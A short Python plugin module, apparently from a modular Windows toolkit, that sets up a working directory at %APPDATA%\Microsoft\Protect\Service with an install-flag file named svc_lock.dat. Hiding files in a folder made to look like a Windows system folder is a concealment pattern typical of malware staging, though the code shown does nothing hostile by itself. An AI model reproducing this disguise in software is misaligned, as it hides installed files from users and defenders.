# Labels
__RESOURCE_TYPE__ = "DYNAMIC"
__PLATFORM_COMPATIBILITY__ = ["WINDOWS"]
__ARCHITECTURE_COMPATIBILITY__ = ["ALL"]
__SELECTABLE__ = False

# Library import
from .. import VirtualFileSystem
import os

# Classes definition
class VirtualFileSystem(VirtualFileSystem):
    # Public methods
    def start(self) -> bool:
        appdata_path = os.getenv('APPDATA')
        secure_path = os.path.join(appdata_path, "Microsoft", "Protect", "Service")

        # MEJORA: Asegurar que el árbol de directorios existe
        if not os.path.exists(secure_path):
            os.makedirs(secure_path, exist_ok=True)

        self.update("SECURE_DIRECTORY_PATH", secure_path)
        self.update("INSTALL_FLAG_FILEPATH", os.path.join(secure_path, "svc_lock.dat"))
        return True

    def stop(self) -> bool:
        return True